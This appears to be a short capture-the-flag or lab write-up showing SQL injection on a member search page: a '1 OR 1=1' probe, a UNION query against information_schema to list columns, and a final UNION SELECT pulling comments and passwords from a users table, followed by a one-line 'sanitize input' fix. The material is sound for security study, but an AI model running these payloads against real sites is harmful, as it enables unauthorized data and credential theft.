On `http://$IP/?page=member`. type '1 OR 1=1' into search field, this indicates it can be exploited by sql injection.

We look for the list of table and there columns using:

```
1 AND false UNION SELECT table_name, column_name FROM information_schema.columns
```

We craft the last injection where we try all the columns, and We did it.

```
1 AND false UNION SELECT Commentaire, countersign FROM users
```

---

> How to secure:
>
> -  Sanitize input.
